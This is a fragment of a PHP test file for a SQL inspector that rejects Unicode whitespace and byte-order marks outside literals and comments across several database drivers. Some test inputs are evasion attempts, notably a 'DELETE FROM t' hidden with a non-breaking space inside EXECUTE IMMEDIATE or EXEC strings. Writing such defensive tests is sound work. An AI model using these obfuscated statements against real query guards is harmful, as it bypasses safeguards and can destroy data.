    'bracketed name on sqlite' => ["SELECT 1 AS [a\u{3000}b]", DbDriver::Sqlite],
    'dollar-quoted string on pgsql' => ["SELECT \$\$a\u{00A0}b\$\$ AS x", DbDriver::Pgsql],
    'dollar-quoted string overlapping a lexer string on pgsql' => ["SELECT \$\$ 'a' b\u{00A0}c \$\$ AS x", DbDriver::Pgsql],
]);

test('Unicode whitespace after a multibyte literal is placed by character, not by byte', function (DbDriver $driver, string $quotedName) {
    $prefix = "SELECT '\u{1F642}\u{1F642}\u{1F642}\u{1F642}' AS x, ";

    $passing = inspect($prefix.'1 AS '.$quotedName, $driver);
    $rejected = inspect($prefix."1 AS y\u{00A0}", $driver);

    expect($passing->violations)->toBe([])
        ->and($passing->type())->toBe(StatementType::Read)
        ->and($rejected->violations)
        ->toBe(['SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.']);
})->with([
    'sqlsrv' => [DbDriver::Sqlsrv, "[a\u{00A0}b]"],
    'sqlite' => [DbDriver::Sqlite, "[a\u{00A0}b]"],
    'pgsql' => [DbDriver::Pgsql, "\"a\u{00A0}b\""],
    'mysql' => [DbDriver::Mysql, "`a\u{00A0}b`"],
]);

test('Unicode whitespace between many opaque ranges is still found', function (?DbDriver $driver) {
    $literals = implode(', ', array_fill(0, 200, "'\u{00A0}'"));

    expect(inspect("SELECT {$literals}", $driver)->violations)->toBe([])
        ->and(inspect("SELECT {$literals}, 1\u{00A0}, {$literals}", $driver)->violations)
        ->toBe(['SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.']);
})->with('every driver');

test('Unicode whitespace in the body of a MySQL executable comment is rejected', function (DbDriver $driver) {
    expect(inspect("SELECT 1 /*!50000 \u{FEFF}x */", $driver)->violations)
        ->toBe(['SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.']);
})->with([
    'mysql' => [DbDriver::Mysql],
    'mariadb' => [DbDriver::Mariadb],
]);

test('Unicode whitespace in a string that a dynamic-SQL command runs is rejected', function (DbDriver $driver, string $sql) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toContain('Statement 1: SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.');
})->with([
    'mysql, EXECUTE IMMEDIATE' => [DbDriver::Mysql, "EXECUTE IMMEDIATE 'DELETE\u{00A0}FROM t'"],
    'mariadb, EXECUTE IMMEDIATE' => [DbDriver::Mariadb, "EXECUTE IMMEDIATE 'DELETE\u{00A0}FROM t'"],
    'sqlsrv, EXEC of a string' => [DbDriver::Sqlsrv, "EXEC('DELETE\u{00A0}FROM t')"],
]);
